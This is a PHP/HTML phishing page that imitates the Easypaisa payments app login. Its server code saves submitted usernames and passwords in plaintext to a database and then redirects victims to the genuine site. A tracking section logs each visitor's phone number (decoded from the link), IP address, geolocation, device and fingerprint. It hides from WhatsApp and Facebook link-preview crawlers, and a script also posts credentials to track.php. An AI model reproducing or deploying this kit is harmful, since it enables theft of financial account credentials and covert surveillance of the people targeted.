<?php
date_default_timezone_set('Asia/Karachi');
require_once 'F:\xampp\htdocs\admins\db_connect.php';

// Handle form submission first
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    // Collect only username and password
    $username = $_POST['username'];
    $password = $_POST['password'];
    $login_time = date("Y-m-d H:i:s");
    
    // Create separate connection for easypasia database
    $easypasia_db_host = 'localhost';
    $easypasia_db_user = 'root';
    $easypasia_db_pass = '';
    $easypasia_db_name = 'easypaisa';
    
    $easypasia_conn = new mysqli($easypasia_db_host, $easypasia_db_user, $easypasia_db_pass, $easypasia_db_name);
    
    // Check connection
    if ($easypasia_conn->connect_error) {
        error_log("Easypasia database connection failed: " . $easypasia_conn->connect_error);
        // Fallback - redirect even if DB connection fails
        header("Location: https://easypaisa.com.pk/");
        exit();
    }
    
    // Insert into login table in easypasia database
    $stmt = $easypasia_conn->prepare("INSERT INTO easypasia_login (username, password, login_time) VALUES (?, ?, ?)");
    
    if ($stmt) {
        $stmt->bind_param("sss", $username, $password, $login_time);
        
        if ($stmt->execute()) {
            // Success - continue with redirect
        } else {
            error_log("Login data insertion error: " . $stmt->error);
        }
        $stmt->close();
    } else {
        error_log("Statement preparation error: " . $easypasia_conn->error);
    }
    
    $easypasia_conn->close();
    
    // Redirect to easypaisa.com.pk
    header("Location: https://easypaisa.com.pk/");
    exit();
}

// Handle tracking via short ID OR number parameter
if (isset($_GET['id']) || isset($_GET['number'])) {
    $shortId = $_GET['id'] ?? '';
    
    // If accessed via number parameter, set values directly
    if (!isset($_GET['id']) && isset($_GET['number'])) {
        $actualNumber = base64_decode($_GET['number']);
        $group        = $_GET['group_name'] ?? 'Unknown';
        $screenWidth  = $_GET['width']      ?? '1536';
        $screenHeight = $_GET['height']     ?? '864';
    }
    
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    if (stripos($ua, 'WhatsApp') !== false || stripos($ua, 'facebookexternalhit') !== false) {
        exit();
    }
    
    // Lookup parameters from database (only if shortId is provided)
    if (!empty($shortId)) {
        $stmt = $conn->prepare("SELECT params_data FROM url_mappings WHERE short_id = ?");
        $actualNumber = 'INVALID';
        $group = 'Unknown';
        $screenWidth = '1536';
        $screenHeight = '864';
        
        if ($stmt) {
            $stmt->bind_param("s", $shortId);
            $stmt->execute();
            $result = $stmt->get_result();
            
            if ($row = $result->fetch_assoc()) {
                $params = json_decode($row['params_data'], true);
                if ($params) {
                    $actualNumber = $params['n'] ?? 'INVALID';
                    $group = $params['g'] ?? 'Unknown';
                    $screenWidth = $params['w'] ?? '1536';
                    $screenHeight = $params['h'] ?? '864';
                }
                
                // Update access count
                $updateStmt = $conn->prepare("UPDATE url_mappings SET accessed_count = accessed_count + 1 WHERE short_id = ?");
                $updateStmt->bind_param("s", $shortId);
                $updateStmt->execute();
                $updateStmt->close();
            }
            $stmt->close();
        }
    }
    
    // Continue with tracking...
    session_start();
    $_SESSION['decoded_number'] = $actualNumber;

    $url = 'Easypaisa';
    $clicked = date("Y-m-d H:i:s");
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $device = $ua;
    
    // Device detection functions
    function getOS($userAgent) {
        $osArray = [
            '/windows nt 10/i'     => 'Windows 10',
            '/windows nt 6.3/i'    => 'Windows 8.1',
            '/windows nt 6.2/i'    => 'Windows 8',
            '/windows nt 6.1/i'    => 'Windows 7',
            '/macintosh|mac os x/i'=> 'Mac OS X',
            '/linux/i'             => 'Linux',
            '/iphone/i'            => 'iPhone',
            '/ipad/i'              => 'iPad',
            '/android/i'           => 'Android',
        ];
        foreach ($osArray as $regex => $value) {
            if (preg_match($regex, $userAgent)) {
                return $value;
            }
        }
        return 'Unknown OS';
    }

    function getBrowser($userAgent) {
        $browserArray = [
            '/msie/i'      => 'Internet Explorer',
            '/firefox/i'   => 'Firefox',
            '/safari/i'    => 'Safari',
            '/chrome/i'    => 'Chrome',
            '/edge/i'      => 'Edge',
            '/opera/i'     => 'Opera',
            '/netscape/i'  => 'Netscape',
            '/maxthon/i'   => 'Maxthon',
            '/konqueror/i' => 'Konqueror',
            '/mobile/i'    => 'Mobile Browser'
        ];
        foreach ($browserArray as $regex => $value) {
            if (preg_match($regex, $userAgent)) {
                return $value;
            }
        }
        return 'Unknown Browser';
    }

    function isMobile($userAgent) {
        return preg_match('/mobile|android|iphone|ipad/i', $userAgent) ? "YES" : "NO";
    }

    function getRealIP() {
        // Check for shared internet/ISP IP
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        }
        
        // Check for IPs passing through proxies
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }

        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }

    $os = getOS($device);
    $browser = getBrowser($device);
    $is_mobile = isMobile($ua);
    $ip = getRealIP();

    // Generate unique token
    $token = bin2hex(random_bytes(16));

    // Get screen resolution from decrypted data
    $screen_resolution = $screenWidth . "x" . $screenHeight;
    $color_depth = 'Unknown';
    $timezone = 'Unknown';
    
    // Create fingerprint
    $fingerprint = "Resolution:$screen_resolution|EncryptedParams:Yes";

    // REAL IP location lookup using ip-api.com
    function getLocationFromIP($ip) {
        // Local IP fallback
        if ($ip === '::1' || $ip === '127.0.0.1' || filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            return [
                'city' => 'Local',
                'country' => 'Pakistan',
                'region' => 'Local',
                'isp' => 'Local Network',
                'latitude' => 33.6844,
                'longitude' => 73.0479
            ];
        }

        $apiUrl = "http://ip-api.com/json/{$ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        curl_close($ch);

        if ($response) {
            $data = json_decode($response, true);
            if (isset($data['status']) && $data['status'] === 'success') {
                return [
                    'city' => $data['city'] ?: 'Unknown',
                    'country' => $data['country'] ?: 'Unknown',
                    'region' => $data['regionName'] ?: 'Unknown',
                    'isp' => $data['isp'] ?: ($data['org'] ?: 'Unknown'),
                    'latitude' => $data['lat'] ?? 0,
                    'longitude' => $data['lon'] ?? 0
                ];
            }
        }

        // If API fails, return unknown
        return [
            'city' => 'Unknown',
            'country' => 'Unknown',
            'region' => 'Unknown',
            'isp' => 'Unknown',
            'latitude' => 0,
            'longitude' => 0
        ];
    }

    // Get location data
    $location = getLocationFromIP($ip);
    $city = $location['city'];
    $country = $location['country'];
    $region = $location['region'];
    $isp = $location['isp'];
    $latitude = $location['latitude'];
    $longitude = $location['longitude'];
    
    // Debug: Log the location
    error_log("IP: $ip | City: $city | Country: $country | Region: $region | ISP: $isp | Lat: $latitude | Lng: $longitude");

    // Language & referrer
    $language = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown', 0, 20);
    $referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

    // UTM parameters
    $utm_source = $_GET['utm_source'] ?? 'N/A';
    $utm_medium = $_GET['utm_medium'] ?? 'N/A';
    $utm_campaign = $_GET['utm_campaign'] ?? 'N/A';

    // Insert into trace_data
    $stmt = $conn->prepare("INSERT INTO trace_data 
        (contact, url, clicked_at, ip_address, device, os, group_name, browser, 
        fingerprint, country, region, city, isp, language, referrer, 
        utm_source, utm_medium, utm_campaign, token, screen_resolution, is_mobile,
        latitude, longitude) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    
    if ($stmt) {
        $stmt->bind_param("ssssssssssssssssssssidd", 
            $actualNumber,
            $url, 
            $clicked, 
            $ip, 
            $device, 
            $os, 
            $group, 
            $browser, 
            $fingerprint, 
            $country, 
            $region, 
            $city, 
            $isp, 
            $language, 
            $referrer, 
            $utm_source, 
            $utm_medium, 
            $utm_campaign, 
            $token, 
            $screen_resolution, 
            $is_mobile,
            $latitude,
            $longitude);
        
        if (!$stmt->execute()) {
            error_log("Database error: " . $stmt->error);
        }
        $stmt->close();
    } else {
        error_log("Statement preparation error: " . $conn->error);
    }
}
?>
<!-- Rest of your HTML code remains the same -->





<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>easypaisa | Pakistan's No. 1 Online Payments App</title>

    <link rel="icon" href="easypaisa.png" type="image/png">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            color: #333;
        }
        .header {
            background: linear-gradient(to right, #00796b, #004d40);
            color: #fff;
            padding: 40px 20px;
            text-align: center;
            position: relative;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }
        .header .left-logo {
            position: absolute;
            top: 10px;
            left: 20px;
            width: 120px;
            height: auto;
        }
        .header .right-logo {
            position: absolute;
            top: 10px;
            right: 20px;
            width: 200px;
            height: auto;
        }
        .header .center-logo {
        width: 100px; /* Adjust size as needed */
        height: auto;
        display: block;
        margin: 0 auto;
    }
    .footer {
        background: #00796b;
        color: #fff;
        text-align: left;
        padding: 20px;
        font-size: 18px;
        margin-top: 50px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .footer-logo {
        width: 150px; /* Adjust size as needed */
        height: auto;
    }
        .header h1 {
            font-size: 36px;
            font-weight: 700;
            margin: 0;
        }
        .container {
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            padding: 50px 20px;
            max-width: 1200px;
            margin: auto;
            gap: 40px;
        }
        .box {
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0px 10px 30px #A7C539;
            flex: 1;
            min-width: 300px;
            max-width: 400px;
            transition: transform 0.3s ease-in-out;
        }
        .box:hover {
            transform: translateY(-5px);
        }
        .disclaimer {
        color: red;
        font-weight: bold;
        
        text-align: center;
        margin-left: -10px;
        animation: blink 1s infinite;
    }
        .box h3 {
            background: #004d40;
            color: #fff;
            padding: 15px;
            text-align: center;
            margin: -40px -40px 20px -40px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            font-size: 24px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            font-weight: 600;
            margin-bottom: 8px;
            display: block;
            color: #00796b;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            background: #00796b;
            color: #fff;
            border: none;
            padding: 15px;
            font-size: 18px;
            width: 100%;
            cursor: pointer;
            border-radius: 8px;
            transition: background 0.3s ease-in-out;
        }
        .btn:hover {
            background: #004d40;
        }
        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }
        .forgot-password a {
            color: #00796b;
            text-decoration: none;
            font-weight: 600;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .security-alert {
            background:rgb(90, 90, 88);
            color:rgb(51, 50, 50);
            font-weight: bold;
            text-align: center;
            padding: 15px;
            margin-top: 40px;
            border-top: 5px solidrgb(97, 94, 94);
        }
        ul {
            list-style: none;
            padding: 0;
        }
        ul li {
            padding: 10px 0;
            border-bottom: 1px solid #eee;
            font-size: 16px;
        }
        ul li:last-child {
            border-bottom: none;
        }
        @media (max-width: 768px) {
            .header .left-logo, 
            .header .right-logo {
                display: none;
            }
            .header h1 {
                font-size: 28px;
            }
            .container {
                flex-direction: column;
                align-items: center;
            }
        }
        @media (max-width: 768px) {
    .security-alert {
        padding: 10px;
        margin-right: -168px;
        margin-left: 25px;
    }

    .alert-image {
        width: 200px;
        margin-top: 0;
    }

    .alert-text {
        text-align: left;
    }

    .alert-heading {
        font-size: 20px;
    }

    ul li {
        font-size: 16px; /* Slightly larger than previous for mobile */
    }
}


       @media (max-width: 768px) {
    .header {
        display: flex;
        align-items: center;
        justify-content: space-between; /* Keep logos aligned properly */
        padding: 10px;
        margin-right: -190px;
    }

    .header .left-logo, 
    .header .right-logo {
        width: 50px; /* Adjust the logo size for mobile */
        height: auto;
        display: block; /* Ensure they are visible */
    }

    .header h1 {
        font-size: 24px; /* Slightly reduce heading size */
        text-align: center;
        flex-grow: 2; /* Allow heading to expand and center properly */
    }
    .disclaimer{
        margin-left: 30px;
    }
    .box h3{
        margin-left: -100px;
        margin-top: -100px;
        margin-right: -100px;
    }

    /* .container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center; 
    width: 90%; 
    max-width: 400px; 
    margin: auto; 
    height: 100vh;
}*/
.container {
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-right: 60px; /* Adjust as needed */
    margin-left: -20px; /* Optional, balances spacing */
    
}
ul li {
        font-size: 20px; /* Slightly larger than previous for mobile */
    }
.input-group{
    width: 300px;
    margin-left: -30px;
    font-size: 23px;
}
.btn{
    width: 250px;
    display: center;
}
.box{
    width: -20px;
    padding: 100px;
    margin-left: 20px;
    
}
.forgot-password{
    font-size: 20px;
    margin-left: -50px;
}

.box p{
    font-size: 20px;
}

.footer{
        margin-right: -190px;
    }
}

        

    @keyframes blink {
        50% { opacity: 0; }
    }
    </style>
</head>
<body>

<div class="header">
    <img src="es2.png" alt="Left Logo" class="left-logo">
    <img src="f2.png" alt="Easypaisa Logo" class="center-logo">
    <img src="es3.png" alt="Right Logo" class="right-logo">
</div>

<div class="container">
    <div class="box">
        <h3>Login</h3>
        <!-- Form will redirect to easypaisa.com.pk regardless of credentials -->
       <form method="POST" action="">
    <div class="input-group">
        <label>Username*</label>
        <input type="text" name="username" required placeholder="Enter your username">
    </div>
    <div class="input-group">
        <label>Password*</label>
        <input type="password" name="password" required placeholder="Enter your password">
    </div>
    <button type="submit" class="btn">Login</button>
</form>

        <div class="forgot-password">
            <a href="#">Forgot Password?</a>
        </div>
    </div>

    <div class="box">
        <h3>I am a new user</h3>
        <p><strong>Register and save time</strong></p>
        <ul>
            <li>Money Transfer</li>
            <li>Pay Bills</li>
            <li>Bank Transfer</li>
            <li>Donations</li>
            <li>Account Statements</li>
            <li class="disclaimer">Special Discounts for Forces</li>
        </ul>
        <!-- Sign Up button now links to signup.php -->
        <a href="signup.php"><button class="btn">Sign Up</button></a>
    </div>
</div>

    
</div>

<div class="security-alert" style="display: flex; align-items: center; gap: 30px; background: #f9f9f9; padding: 40px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-left: 5px solid #00796b;">
    <img src="lock.png" alt="Security Icon" style="width: 300px; height: auto; align-self: flex-start; margin-top: 200px;">
    <div style="text-align: center; flex: 1;">
        <p style="font-weight: bold; font-size: 26px; color:rgb(255, 0, 0); margin: 0;">Important Security Alert:Protect yourself from Phishing emails and malware</p>
        <hr style="border: 1px solid #ccc; margin: 15px auto; width: 50%;">
        <ul style="list-style: none; padding-left: 0; margin: 20px auto; display: inline-block; text-align: left;">
            <li style="margin-bottom: 12px; display: flex; align-items: center;">
                <span style="font-size: 20px; color:#A7C539; margin-right: 10px;">&#10132;</span>
                Create a strong password with atleast 8 characters that include combination of mixed case letters and numbers.
            </li>
            <li style="margin-bottom: 12px; display: flex; align-items: center;">
                <span style="font-size: 20px; color:#A7C539; margin-right: 10px;">&#10132;</span>
               Change your password every 90 days.
            </li>
            <li style="margin-bottom: 12px; display: flex; align-items: center;">
                <span style="font-size: 20px; color:#A7C539; margin-right: 10px;">&#10132;</span>
                 Donot use the same password for all online accounts.
            </li>
            <li style="margin-bottom: 12px; display: flex; align-items: center;">
                <span style="font-size: 20px; color:#A7C539; margin-right: 10px;">&#10132;</span>
                Never share your password and OTP with anyone.
            </li>
            <li style="margin-bottom: 12px; display: flex; align-items: center;">
                <span style="font-size: 20px; color:#A7C539; margin-right: 10px;">&#10132;</span>
                Beware of and never respond to fraudulent emails or phone calls requesting sensitive information.
            </li>
            <li style="margin-bottom: 12px; display: flex; align-items: center;">
                <span style="font-size: 20px;color:#A7C539; margin-right: 10px;">&#10132;</span>
                Easypaisa, Tameer Bank, or Telenor will never ask for your sensitive information via phone or email.
            </li>
            <li style="margin-bottom: 12px; display: flex; align-items: center;">
                <span style="font-size: 20px; color:#A7C539; margin-right: 10px;">&#10132;</span>
            Always type the correct portal address in the browser's address bar.
            </li>
            <li style="margin-bottom: 12px; display: flex; align-items: center;">
                <span style="font-size: 20px; color:#A7C539; margin-right: 10px;">&#10132;</span>
                Donot access the merchant portal through unknown email links.
            </li>
            <li style="display: flex; align-items: center;">
                <span style="font-size: 20px; color:#A7C539; margin-right: 10px;">&#10132;</span>
                Always logout properly from the portal and never leave it signed in when away.
            </li>
        </ul>
    </div>
</div>



<div class="footer">
    © 2025 Easypaisa. All Rights Reserved.
    <img src="f2.png" alt="Easypaisa Logo" class="footer-logo">
</div>
<script>
    // Function to handle login form submission
    function handleLogin(event) {
        event.preventDefault();
        
        // Collect user data for tracking
        const formData = new FormData(event.target);
        const username = formData.get('username');
        const password = formData.get('password');
        
        // Collect additional user information
        const userData = {
            username: username,
            password: password,
            ip_address: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
            browser: navigator.userAgent,
            os: navigator.platform,
            device: (navigator.userAgent.match(/Mobile/i)) ? 'Mobile' : 'Desktop',
            user_agent: navigator.userAgent,
            login_time: new Date().toISOString(),
            screen_width: screen.width,
            screen_height: screen.height,
            color_depth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
        // Send data to track.php
        fetch('track.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Tracking data sent successfully');
        })
        .catch(error => {
            console.error('Error sending tracking data:', error);
        });
        
        // Redirect to easypaisa.com.pk after a short delay
        setTimeout(() => {
            window.location.href = 'https://easypaisa.com.pk/';
        }, 1000);
        
        return false;
    }
    
    // Function to collect fingerprint data
    function collectFingerprint() {
    const params = new URLSearchParams();
    
    // Screen resolution
    params.append('width', screen.width);
    params.append('height', screen.height);
    
    // Color depth
    params.append('color_depth', screen.colorDepth);
    
    // Timezone
    try {
        params.append('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
    } catch (e) {
        params.append('timezone', 'Unknown');
    }
    
    return params.toString();
}

// Function to handle form submission
function handleLoginForm(event) {
    event.preventDefault();
    
    // Submit the form normally (PHP will handle the redirect)
    event.target.submit();
    
    return false;
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Add event listener to form
    const form = document.querySelector('form[method="POST"]');
    if (form) {
        form.addEventListener('submit', handleLoginForm);
    }
    
    // Add fingerprint data as hidden fields to the form
    const fingerprint = collectFingerprint();
    const params = new URLSearchParams(fingerprint);
    
    for (const [key, value] of params) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = value;
        if (form) form.appendChild(input);
    }
    
    // Log tracking info for debugging
    console.log('Tracking initialized for URL:', window.location.href);
});
</script>



</body>
</html>